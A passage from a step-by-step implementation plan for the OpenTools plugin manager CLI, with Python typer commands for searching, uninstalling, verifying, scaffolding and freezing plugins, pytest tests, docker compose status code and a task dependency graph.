        _error(e.message, hint=e.hint)
        return  # unreachable but helps type checker

    if json_output:
        out.print(json_mod.dumps(
            [r.model_dump(mode="json") for r in results], indent=2
        ))
        return

    if not results:
        out.print(f"No plugins found matching '{query}'.")
        return

    table = Table(title=f"Search: {query}")
    table.add_column("Name")
    table.add_column("Description")
    table.add_column("Version")
    table.add_column("Domain")
    table.add_column("Trust")
    for r in results:
        table.add_row(r.name, r.description[:50], r.latest_version,
                      r.domain, r.trust_tier)
    out.print(table)


@plugin_app.command("info")
def plugin_info(
    name: str = typer.Argument(..., help="Plugin name"),
    version: Optional[str] = typer.Option(None, "--version", help="Specific version"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Show plugin details."""
    from opentools_plugin_core.registry import RegistryClient
    from opentools_plugin_core.errors import RegistryError

    home = _opentools_home()
    client = RegistryClient(cache_dir=home / "registry-cache")

    try:
        entry = client.lookup(name)
    except RegistryError as e:
        _error(e.message, hint=e.hint)
        return

    if entry is None:
        _error(f"Plugin '{name}' not found", hint=f"opentools plugin search {name}")
        return

    if json_output:
        out.print(entry.model_dump_json(indent=2))
        return

    out.print(f"[bold]{entry.name}[/bold] v{entry.latest_version}")
    out.print(f"  {entry.description}")
    out.print(f"  Domain: {entry.domain}")
    out.print(f"  Author: {entry.author}")
    out.print(f"  Trust: {entry.trust_tier}")
    out.print(f"  Tags: {', '.join(entry.tags)}")
    out.print(f"  Repo: {entry.repo}")


@plugin_app.command("install")
def plugin_install(
    names: list[str] = typer.Argument(..., help="Plugin name(s) to install"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
    registry_name: Optional[str] = typer.Option(None, "--registry", help="Pin to registry"),
    pre: bool = typer.Option(False, "--pre", help="Include pre-release versions"),
    pull: bool = typer.Option(False, "--pull", help="Pull container images"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Install plugin(s) from the registry."""
    out.print(f"[bold]Installing:[/bold] {', '.join(names)}")
    out.print("[yellow]Install pipeline not yet fully wired. Use Task 13 (installer) for core logic.[/yellow]")


@plugin_app.command("uninstall")
def plugin_uninstall(
    name: str = typer.Argument(..., help="Plugin name"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
    keep_images: bool = typer.Option(False, "--keep-images", help="Keep container images"),
    purge: bool = typer.Option(False, "--purge", help="Remove cache too"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Uninstall a plugin."""
    import shutil
    from opentools_plugin_core.index import PluginIndex

    home = _opentools_home()
    idx = PluginIndex(home / "plugins.db")

    plugin = idx.get(name)
    if plugin is None:
        _error(f"Plugin '{name}' is not installed", hint="opentools plugin list")
        return

    if not yes:
        confirm = typer.confirm(f"Uninstall {name} v{plugin.version}?")
        if not confirm:
            out.print("Cancelled.")
            raise typer.Exit(0)

    # Remove files
    plugin_dir = home / "plugins" / name
    if plugin_dir.exists():
        shutil.rmtree(plugin_dir)

    # Remove from index
    idx.unregister(name)

    if purge:
        # Would also clear cache entries -- not yet implemented
        pass

    if json_output:
        out.print(json_mod.dumps({"uninstalled": name, "version": plugin.version}))
    else:
        out.print(f"[green]Uninstalled:[/green] {name} v{plugin.version}")


@plugin_app.command("update")
def plugin_update(
    names: list[str] = typer.Argument(None, help="Plugin name(s), or omit for all"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
    pre: bool = typer.Option(False, "--pre", help="Include pre-release"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Update plugin(s) to latest version."""
    out.print("[yellow]Update flow not yet fully wired.[/yellow]")


# ---------------------------------------------------------------------------
# Lifecycle commands: up, down, logs, exec, pull, setup, verify
# ---------------------------------------------------------------------------


@plugin_app.command("up")
def plugin_up(
    name: str = typer.Argument(..., help="Plugin name"),
    pull_images: bool = typer.Option(False, "--pull", help="Pull images first"),
):
    """Start plugin containers."""
    out.print(f"[yellow]Starting containers for {name}...[/yellow]")


@plugin_app.command("down")
def plugin_down(
    name: str = typer.Argument(..., help="Plugin name"),
):
    """Stop plugin containers."""
    out.print(f"[yellow]Stopping containers for {name}...[/yellow]")


@plugin_app.command("logs")
def plugin_logs(
    name: str = typer.Argument(..., help="Plugin name"),
    tail: int = typer.Option(50, "--tail", help="Number of lines"),
):
    """View plugin container logs."""
    out.print(f"[yellow]Logs for {name} (not yet wired).[/yellow]")


@plugin_app.command("exec")
def plugin_exec(
    name: str = typer.Argument(..., help="Plugin name"),
    container: str = typer.Argument(..., help="Container name"),
    command: list[str] = typer.Argument(..., help="Command to run"),
):
    """Exec into a plugin container."""
    out.print(f"[yellow]Exec into {container} of {name} (not yet wired).[/yellow]")


@plugin_app.command("pull")
def plugin_pull(
    name: str = typer.Argument(None, help="Plugin name, or omit for all"),
    all_plugins: bool = typer.Option(False, "--all", help="Pull all"),
):
    """Pull container images for a plugin."""
    out.print("[yellow]Pull not yet wired.[/yellow]")


@plugin_app.command("setup")
def plugin_setup(
    name: str = typer.Argument(..., help="Plugin name"),
):
    """Re-run container setup for a plugin."""
    out.print(f"[yellow]Setup for {name} (not yet wired).[/yellow]")


@plugin_app.command("verify")
def plugin_verify(
    name: str = typer.Argument(..., help="Plugin name"),
    accept: bool = typer.Option(False, "--accept", help="Re-record hashes"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Check file integrity for an installed plugin."""
    out.print(f"[yellow]Verify for {name} (not yet wired).[/yellow]")


# ---------------------------------------------------------------------------
# Authoring commands: init, link, unlink, validate
# ---------------------------------------------------------------------------


@plugin_app.command("init")
def plugin_init(
    name: str = typer.Argument(..., help="Plugin name to scaffold"),
):
    """Scaffold a new plugin project."""
    out.print(f"[yellow]Scaffold for {name} (not yet wired).[/yellow]")


@plugin_app.command("link")
def plugin_link(
    path: str = typer.Argument(".", help="Path to local plugin"),
):
    """Symlink a local plugin for development."""
    out.print(f"[yellow]Link {path} (not yet wired).[/yellow]")


@plugin_app.command("unlink")
def plugin_unlink(
    name: str = typer.Argument(..., help="Plugin name to unlink"),
):
    """Remove a development symlink."""
    out.print(f"[yellow]Unlink {name} (not yet wired).[/yellow]")


@plugin_app.command("validate")
def plugin_validate(
    path: str = typer.Argument(".", help="Path to plugin directory"),
    strict: bool = typer.Option(False, "--strict", help="Treat warnings as errors"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Validate a local plugin (author tool)."""
    out.print(f"[yellow]Validate {path} (not yet wired).[/yellow]")


# ---------------------------------------------------------------------------
# Team commands: freeze, sync, export, import, rollback, prune
# ---------------------------------------------------------------------------


@plugin_app.command("freeze")
def plugin_freeze():
    """Generate a lockfile from current installed state."""
    out.print("[yellow]Freeze (not yet wired).[/yellow]")


@plugin_app.command("sync")
def plugin_sync(
    lockfile: Optional[str] = typer.Option(None, "--lockfile", help="Path to lockfile"),
    plugin_set: Optional[str] = typer.Option(None, "--set", help="Path to plugin set"),
    freeze_path: Optional[str] = typer.Option(None, "--freeze", help="Also generate lockfile"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
):
    """Sync to a lockfile or plugin set."""
    out.print("[yellow]Sync (not yet wired).[/yellow]")


@plugin_app.command("export")
def plugin_export(
    name: str = typer.Argument(..., help="Plugin name"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output path"),
):
    """Export a plugin to a .otp archive."""
    out.print(f"[yellow]Export {name} (not yet wired).[/yellow]")


@plugin_app.command("import")
def plugin_import_cmd(
    archive: str = typer.Argument(..., help="Path to .otp archive"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
):
    """Install a plugin from a .otp archive."""
    out.print(f"[yellow]Import {archive} (not yet wired).[/yellow]")


@plugin_app.command("rollback")
def plugin_rollback(
    name: str = typer.Argument(..., help="Plugin name"),
    version: Optional[str] = typer.Option(None, "--version", help="Target version"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
):
    """Roll back a plugin to a previous version."""
    from opentools_plugin_core.updater import (
        get_available_versions,
        get_active_version,
        rollback,
    )

    home = _opentools_home()
    plugin_dir = home / "plugins" / name
    if not plugin_dir.exists():
        _error(f"Plugin '{name}' not installed", hint="opentools plugin list")
        return

    active = get_active_version(plugin_dir)
    versions = get_available_versions(plugin_dir)

    if not version:
        # Pick the latest non-active version
        others = [v for v in versions if v != active]
        if not others:
            _error("No previous version to roll back to")
            return
        version = others[-1]

    out.print(f"Rolling back {name} from {active} to {version}")
    rollback(plugin_dir, version)
    out.print(f"[green]Rolled back to {version}[/green]")


@plugin_app.command("prune")
def plugin_prune(
    name: Optional[str] = typer.Argument(None, help="Plugin name, or omit for all"),
    keep: int = typer.Option(1, "--keep", help="Versions to keep besides active"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation"),
):
    """Delete old version directories."""
    from opentools_plugin_core.updater import prune_old_versions

    home = _opentools_home()
    plugins_dir = home / "plugins"

    if name:
        dirs = [plugins_dir / name]
    else:
        dirs = [d for d in plugins_dir.iterdir() if d.is_dir()]

    total_removed = 0
    for d in dirs:
        if not (d / ".active").exists():
            continue
        removed = prune_old_versions(d, keep=keep)
        total_removed += len(removed)
        if removed:
            out.print(f"  {d.name}: removed {', '.join(removed)}")

    out.print(f"[green]Pruned {total_removed} old version(s).[/green]")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/cli && pip install -e "../plugin-core[dev]" && pip install -e ".[dev]" && python -m pytest tests/test_plugin_cli.py -x -v`
Expected: PASS (all 4 tests)

- [ ] **Step 5: Commit**

---

### Task 16: CLI Commands (Lifecycle) -- up, down, logs, exec, pull, setup, verify

**Files:**
- Modify: `packages/cli/src/opentools/plugin_cli.py` (wire lifecycle commands)
- Test: `packages/cli/tests/test_plugin_cli.py` (extend)

- [ ] **Step 1: Write failing tests**

```python
# Append to packages/cli/tests/test_plugin_cli.py

class TestPluginVerify:
    def test_verify_not_installed(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["verify", "nonexistent"])
        assert result.exit_code == 1 or "not installed" in result.stdout.lower()


class TestPluginRollback:
    def test_rollback_not_installed(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["rollback", "nonexistent"])
        assert result.exit_code == 1 or "not installed" in result.stdout.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/cli && python -m pytest tests/test_plugin_cli.py::TestPluginVerify -x`
Expected: FAIL (verify command does not yet check install state)

- [ ] **Step 3: Wire the verify command**

Update `plugin_verify` in `plugin_cli.py` to actually check integrity:

```python
@plugin_app.command("verify")
def plugin_verify(
    name: str = typer.Argument(..., help="Plugin name"),
    accept: bool = typer.Option(False, "--accept", help="Re-record hashes"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Check file integrity for an installed plugin."""
    import hashlib
    from opentools_plugin_core.index import PluginIndex
    from opentools_plugin_core.installer import read_active_version

    home = _opentools_home()
    idx = PluginIndex(home / "plugins.db")
    plugin = idx.get(name)

    if plugin is None:
        _error(f"Plugin '{name}' not installed", hint="opentools plugin list")
        return

    plugin_dir = home / "plugins" / name
    active = read_active_version(plugin_dir)
    if not active:
        _error(f"No active version for '{name}'")
        return

    records = idx.get_integrity(name)
    if not records and not accept:
        out.print(f"[yellow]No integrity records for {name}. Run with --accept to record.[/yellow]")
        return

    if accept:
        # Re-record hashes
        version_dir = plugin_dir / active
        count = 0
        for f in version_dir.rglob("*"):
            if f.is_file():
                sha = hashlib.sha256(f.read_bytes()).hexdigest()
                rel = str(f.relative_to(version_dir))
                idx.record_integrity(name, rel, sha)
                count += 1
        out.print(f"[green]Recorded {count} file hashes for {name}.[/green]")
        return

    # Verify against recorded hashes
    version_dir = plugin_dir / active
    failures = []
    for rec in records:
        fpath = version_dir / rec.file_path
        if not fpath.exists():
            failures.append((rec.file_path, "missing"))
        else:
            actual = hashlib.sha256(fpath.read_bytes()).hexdigest()
            if actual != rec.sha256:
                failures.append((rec.file_path, "modified"))

    if json_output:
        out.print(json_mod.dumps({
            "plugin": name, "version": active,
            "verified": len(failures) == 0, "failures": failures,
        }))
    elif failures:
        out.print(f"[red]Integrity check FAILED for {name}:[/red]")
        for path, reason in failures:
            out.print(f"  {reason}: {path}")
    else:
        out.print(f"[green]Integrity OK for {name} ({len(records)} files).[/green]")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/cli && python -m pytest tests/test_plugin_cli.py -x -v`
Expected: PASS

- [ ] **Step 5: Commit**

---

### Task 17: CLI Commands (Authoring) -- init, link, unlink, validate

**Files:**
- Modify: `packages/cli/src/opentools/plugin_cli.py` (wire authoring commands)
- Test: `packages/cli/tests/test_plugin_cli.py` (extend)

- [ ] **Step 1: Write failing tests**

```python
# Append to packages/cli/tests/test_plugin_cli.py

class TestPluginInit:
    def test_init_creates_scaffold(self, tmp_path):
        from opentools.plugin_cli import plugin_app

        result = runner.invoke(plugin_app, ["init", "my-scanner"], input="\n")
        # Scaffold currently prints "not yet wired" - we need to actually wire it
        assert "my-scanner" in result.stdout


class TestPluginValidate:
    def test_validate_valid_plugin(self, tmp_path):
        from opentools.plugin_cli import plugin_app

        # Create a minimal plugin
        manifest = tmp_path / "opentools-plugin.yaml"
        manifest.write_text(
            "name: test\nversion: 1.0.0\ndescription: T\n"
            "author:\n  name: t\nlicense: MIT\n"
            "min_opentools_version: '0.3.0'\ntags: []\ndomain: pentest\n"
            "provides:\n  skills: []\n  recipes: []\n  containers: []\n"
        )
        result = runner.invoke(plugin_app, ["validate", str(tmp_path)])
        assert result.exit_code == 0 or "valid" in result.stdout.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/cli && python -m pytest tests/test_plugin_cli.py::TestPluginInit -x`
Expected: FAIL (scaffold not wired)

- [ ] **Step 3: Wire init and validate commands**

Update `plugin_init` in `plugin_cli.py`:

```python
@plugin_app.command("init")
def plugin_init(
    name: str = typer.Argument(..., help="Plugin name to scaffold"),
):
    """Scaffold a new plugin project."""
    from pathlib import Path

    target = Path.cwd() / name
    target.mkdir(exist_ok=True)

    manifest = {
        "name": name,
        "version": "0.1.0",
        "description": f"{name} plugin for OpenTools",
        "author": {"name": "Your Name"},
        "license": "MIT",
        "min_opentools_version": "0.3.0",
        "tags": [],
        "domain": "pentest",
        "provides": {"skills": [], "recipes": [], "containers": []},
    }

    from ruamel.yaml import YAML
    yaml = YAML()
    yaml.default_flow_style = False

    with (target / "opentools-plugin.yaml").open("w") as f:
        yaml.dump(manifest, f)

    (target / "skills").mkdir(exist_ok=True)
    (target / "recipes").mkdir(exist_ok=True)
    (target / "containers").mkdir(exist_ok=True)
    (target / "README.md").write_text(f"# {name}\n\nAn OpenTools plugin.\n")

    out.print(f"[green]Scaffolded plugin:[/green] {name}")
    out.print(f"  Directory: {target}")
    out.print(f"  Next steps:")
    out.print(f"    1. Edit opentools-plugin.yaml")
    out.print(f"    2. Add skills, recipes, containers")
    out.print(f"    3. opentools plugin link {target}")
    out.print(f"    4. opentools plugin validate {target}")
```

Update `plugin_validate`:

```python
@plugin_app.command("validate")
def plugin_validate(
    path: str = typer.Argument(".", help="Path to plugin directory"),
    strict: bool = typer.Option(False, "--strict", help="Treat warnings as errors"),
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Validate a local plugin (author tool)."""
    from pathlib import Path
    from ruamel.yaml import YAML
    from opentools_plugin_core.models import PluginManifest
    from pydantic import ValidationError

    plugin_path = Path(path)
    manifest_file = plugin_path / "opentools-plugin.yaml"

    if not manifest_file.exists():
        _error(f"No opentools-plugin.yaml in {plugin_path}")
        return

    yaml = YAML()
    with manifest_file.open("r") as f:
        raw = yaml.load(f)

    issues: list[dict] = []
    try:
        manifest = PluginManifest(**raw)
    except ValidationError as e:
        for err in e.errors():
            issues.append({"severity": "error", "field": ".".join(str(l) for l in err["loc"]), "message": err["msg"]})

    if not issues:
        # Check files exist
        for skill in (raw.get("provides", {}).get("skills", []) or []):
            sp = plugin_path / skill.get("path", "")
            if not sp.exists():
                issues.append({"severity": "error", "field": "provides.skills", "message": f"File not found: {sp}"})

        for recipe in (raw.get("provides", {}).get("recipes", []) or []):
            rp = plugin_path / recipe.get("path", "")
            if not rp.exists():
                issues.append({"severity": "warning", "field": "provides.recipes", "message": f"File not found: {rp}"})

    if json_output:
        out.print(json_mod.dumps({"valid": len(issues) == 0, "issues": issues}, indent=2))
    elif issues:
        out.print(f"[red]Validation issues in {path}:[/red]")
        for i in issues:
            color = "red" if i["severity"] == "error" else "yellow"
            out.print(f"  [{color}]{i['severity']}[/{color}] {i['field']}: {i['message']}")
        if strict:
            raise typer.Exit(1)
    else:
        out.print(f"[green]Plugin at {path} is valid.[/green]")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/cli && python -m pytest tests/test_plugin_cli.py -x -v`
Expected: PASS

- [ ] **Step 5: Commit**

---

### Task 18: CLI Commands (Team) -- freeze, sync, export, import, rollback, prune

**Files:**
- Modify: `packages/cli/src/opentools/plugin_cli.py` (wire team commands)
- Test: `packages/cli/tests/test_plugin_cli.py` (extend)

- [ ] **Step 1: Write failing tests**

```python
# Append to packages/cli/tests/test_plugin_cli.py

class TestPluginFreeze:
    def test_freeze_empty(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["freeze"])
        assert result.exit_code == 0
        # Should output valid YAML or JSON
        assert "generated_at" in result.stdout or "plugins" in result.stdout


class TestPluginPrune:
    def test_prune_no_plugins(self, mock_home):
        from opentools.plugin_cli import plugin_app

        with patch("opentools.plugin_cli._opentools_home", return_value=mock_home):
            result = runner.invoke(plugin_app, ["prune"])
        assert result.exit_code == 0
        assert "0" in result.stdout
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/cli && python -m pytest tests/test_plugin_cli.py::TestPluginFreeze -x`
Expected: FAIL (freeze prints placeholder)

- [ ] **Step 3: Wire freeze command**

Update `plugin_freeze` in `plugin_cli.py`:

```python
@plugin_app.command("freeze")
def plugin_freeze(
    json_output: bool = typer.Option(False, "--json", help="Output as JSON"),
):
    """Generate a lockfile from current installed state."""
    from datetime import datetime, timezone
    from opentools_plugin_core.index import PluginIndex
    from opentools_plugin_core.models import Lockfile, LockfileEntry
    from opentools_plugin_core import __version__

    home = _opentools_home()
    idx = PluginIndex(home / "plugins.db")
    plugins = idx.list_all()

    entries = {}
    for p in plugins:
        entries[p.name] = LockfileEntry(
            version=p.version,
            registry=p.registry,
            repo=p.repo,
            ref=f"v{p.version}",
            sha256="",  # Would need to compute from cache
        )

    lockfile = Lockfile(
        generated_at=datetime.now(timezone.utc).isoformat(),
        opentools_version=__version__,
        plugins=entries,
    )

    if json_output:
        out.print(lockfile.model_dump_json(indent=2))
    else:
        from ruamel.yaml import YAML
        import io
        yaml = YAML()
        yaml.default_flow_style = False
        buf = io.StringIO()
        yaml.dump(lockfile.model_dump(mode="json"), buf)
        out.print(buf.getvalue())
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/cli && python -m pytest tests/test_plugin_cli.py -x -v`
Expected: PASS

- [ ] **Step 5: Commit**

---

### Task 19: Loader Integration

**Files:**
- Modify: `packages/cli/src/opentools/plugin.py`
- Test: `packages/cli/tests/test_plugin.py` (extend)

- [ ] **Step 1: Write failing tests**

```python
# Append to or replace packages/cli/tests/test_plugin.py

from pathlib import Path
from unittest.mock import patch
import pytest


class TestSkillSearchPaths:
    def test_includes_builtin(self, tmp_path):
        from opentools.plugin import skill_search_paths

        plugin_dir = tmp_path / "plugin"
        (plugin_dir / "skills").mkdir(parents=True)

        with patch("opentools.plugin.discover_plugin_dir", return_value=plugin_dir):
            paths = skill_search_paths()
        assert any("skills" in str(p) for p in paths)

    def test_includes_marketplace_dir(self, tmp_path):
        from opentools.plugin import skill_search_paths

        plugin_dir = tmp_path / "plugin"
        (plugin_dir / "skills").mkdir(parents=True)

        marketplace = tmp_path / ".opentools" / "plugins"
        marketplace.mkdir(parents=True)

        with patch("opentools.plugin.discover_plugin_dir", return_value=plugin_dir), \
             patch("pathlib.Path.home", return_value=tmp_path):
            paths = skill_search_paths()
        assert any(".opentools" in str(p) for p in paths)


class TestRecipeSearchPaths:
    def test_includes_marketplace(self, tmp_path):
        from opentools.plugin import recipe_search_paths

        plugin_dir = tmp_path / "plugin"
        plugin_dir.mkdir(parents=True)

        marketplace = tmp_path / ".opentools" / "plugins"
        marketplace.mkdir(parents=True)

        with patch("opentools.plugin.discover_plugin_dir", return_value=plugin_dir), \
             patch("pathlib.Path.home", return_value=tmp_path):
            paths = recipe_search_paths()
        assert any(".opentools" in str(p) for p in paths)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/cli && python -m pytest tests/test_plugin.py::TestSkillSearchPaths -x`
Expected: FAIL with "cannot import name 'skill_search_paths'"

- [ ] **Step 3: Extend plugin.py**

```python
# Add to packages/cli/src/opentools/plugin.py, after discover_plugin_dir():

def _marketplace_plugin_dirs() -> list[Path]:
    """Scan ~/.opentools/plugins/ for active plugin version directories."""
    marketplace = Path.home() / ".opentools" / "plugins"
    if not marketplace.is_dir():
        return []

    dirs: list[Path] = []
    for plugin_dir in marketplace.iterdir():
        if not plugin_dir.is_dir():
            continue
        active_file = plugin_dir / ".active"
        if active_file.exists():
            version = active_file.read_text(encoding="utf-8").strip()
            version_dir = plugin_dir / version
            if version_dir.is_dir():
                dirs.append(version_dir)
    return dirs


def skill_search_paths() -> list[Path]:
    """Return search paths for skills: built-in + marketplace."""
    paths: list[Path] = []

    try:
        plugin_dir = discover_plugin_dir()
        paths.append(plugin_dir / "skills")
    except FileNotFoundError:
        pass

    # Marketplace plugins
    for version_dir in _marketplace_plugin_dirs():
        skills_dir = version_dir / "skills"
        if skills_dir.is_dir():
            paths.append(skills_dir)

    # Also include the base marketplace dir for scanning
    marketplace = Path.home() / ".opentools" / "plugins"
    if marketplace.is_dir():
        paths.append(marketplace)

    return paths


def recipe_search_paths() -> list[Path]:
    """Return search paths for recipes: built-in + marketplace."""
    paths: list[Path] = []

    try:
        plugin_dir = discover_plugin_dir()
        paths.append(plugin_dir)
    except FileNotFoundError:
        pass

    for version_dir in _marketplace_plugin_dirs():
        recipes_dir = version_dir / "recipes"
        if recipes_dir.is_dir():
            paths.append(recipes_dir)

    marketplace = Path.home() / ".opentools" / "plugins"
    if marketplace.is_dir():
        paths.append(marketplace)

    return paths
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/cli && python -m pytest tests/test_plugin.py -x -v`
Expected: PASS

- [ ] **Step 5: Commit**

---

### Task 20: Container Status Integration

**Files:**
- Modify: `packages/cli/src/opentools/containers.py`
- Modify: `packages/cli/src/opentools/cli.py` (containers status)
- Test: `packages/cli/tests/test_containers.py` (extend)

- [ ] **Step 1: Write failing tests**

```python
# Append to packages/cli/tests/test_containers.py

from pathlib import Path
from unittest.mock import patch
import pytest


class TestPluginContainerStatus:
    def test_plugin_containers_returned(self, tmp_path):
        from opentools.containers import get_plugin_container_statuses

        # Create a plugin with a compose file
        home = tmp_path / ".opentools"
        plugin_dir = home / "plugins" / "wifi-hacking" / "1.0.0" / "compose"
        plugin_dir.mkdir(parents=True)
        (home / "plugins" / "wifi-hacking" / ".active").write_text("1.0.0")

        compose = plugin_dir / "docker-compose.yaml"
        compose.write_text(
            "services:\n  aircrack-mcp:\n    image: test:1.0\n"
        )

        with patch("pathlib.Path.home", return_value=tmp_path):
            statuses = get_plugin_container_statuses()
        # Should return empty list (Docker not running) but not crash
        assert isinstance(statuses, list)

    def test_no_plugins_returns_empty(self, tmp_path):
        from opentools.containers import get_plugin_container_statuses

        home = tmp_path / ".opentools" / "plugins"
        home.mkdir(parents=True)

        with patch("pathlib.Path.home", return_value=tmp_path):
            statuses = get_plugin_container_statuses()
        assert statuses == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd packages/cli && python -m pytest tests/test_containers.py::TestPluginContainerStatus -x`
Expected: FAIL with "cannot import name 'get_plugin_container_statuses'"

- [ ] **Step 3: Add plugin container status to containers.py**

```python
# Add to packages/cli/src/opentools/containers.py, at module level:

def get_plugin_container_statuses() -> list[ContainerStatus]:
    """Get status of all plugin containers across installed plugins.

    Scans ~/.opentools/plugins/*/active_version/compose/ for compose projects
    and queries their container status.
    """
    from opentools.plugin import _marketplace_plugin_dirs

    statuses: list[ContainerStatus] = []
    for version_dir in _marketplace_plugin_dirs():
        compose_dir = version_dir / "compose"
        if not compose_dir.is_dir():
            continue

        compose_file = compose_dir / "docker-compose.yaml"
        if not compose_file.exists():
            compose_file = compose_dir / "docker-compose.yml"
        if not compose_file.exists():
            continue

        # Query docker compose for this project
        try:
            result = subprocess.run(
                ["docker", "compose", "-f", str(compose_file), "ps", "--format", "json"],
                capture_output=True, timeout=10,
                cwd=str(compose_dir),
            )
            if result.returncode != 0:
                continue

            stdout = result.stdout.decode(errors="replace").strip()
            for line in stdout.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    data = json.loads(line)
                    statuses.append(ContainerStatus(
                        name=data.get("Name", data.get("Service", "")),
                        state=data.get("State", "unknown"),
                        health=data.get("Health"),
                        profile=["plugin"],
                    ))
                except json.JSONDecodeError:
                    continue
        except (subprocess.TimeoutExpired, FileNotFoundError):
            continue

    return statuses
```

Update `containers_status` in `cli.py` to merge plugin containers:

```python
# In the containers_status command, after getting built-in statuses, add:
    try:
        from opentools.containers import get_plugin_container_statuses
        plugin_statuses = get_plugin_container_statuses()
        statuses.extend(plugin_statuses)
    except Exception:
        pass  # Don't break status if plugin scanning fails
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd packages/cli && python -m pytest tests/test_containers.py -x -v`
Expected: PASS

- [ ] **Step 5: Commit**

---

## Dependency Graph

```
Task 1 (scaffolding)
├── Task 2 (models)
│   ├── Task 3 (index)
│   ├── Task 4 (cache)
│   ├── Task 5 (errors) ──────┐
│   ├── Task 6 (sandbox) ─────┤
│   ├── Task 7 (enforcement) ─┤
│   ├── Task 8 (advisor) ─────┤
│   ├── Task 9 (compose) ─────┤
│   ├── Task 10 (verify) ─────┤
│   ├── Task 11 (registry) ───┤
│   └── Task 12 (resolver) ───┤
│       └── Task 13 (installer) ─── uses 3,4,5,6,9,10
│           └── Task 14 (updater) ── uses 13
│               ├── Task 15 (CLI core) ── uses 3,11,14
│               ├── Task 16 (CLI lifecycle) ── uses 9,10,13
│               ├── Task 17 (CLI authoring) ── uses 2,6,7,8
│               └── Task 18 (CLI team) ── uses 3,13,14
├── Task 19 (loader integration) ── uses 13
└── Task 20 (container status) ── uses 9
```

Tasks 2-12 depend only on Task 1 and each other's models. They can be parallelized with up to 4 agents using superpowers:dispatching-parallel-agents.

**Parallel batch 1:** Tasks 1
**Parallel batch 2:** Tasks 2, 5
**Parallel batch 3:** Tasks 3, 4, 6, 7, 8, 10 (all independent, depend only on 2+5)
**Parallel batch 4:** Tasks 9, 11, 12 (depend on models + sandbox/errors)
**Parallel batch 5:** Tasks 13, 14 (installer depends on many; updater depends on installer)
**Parallel batch 6:** Tasks 15, 16, 17, 18 (all CLI, depend on core library)
**Parallel batch 7:** Tasks 19, 20 (integration, depend on installer and compose)
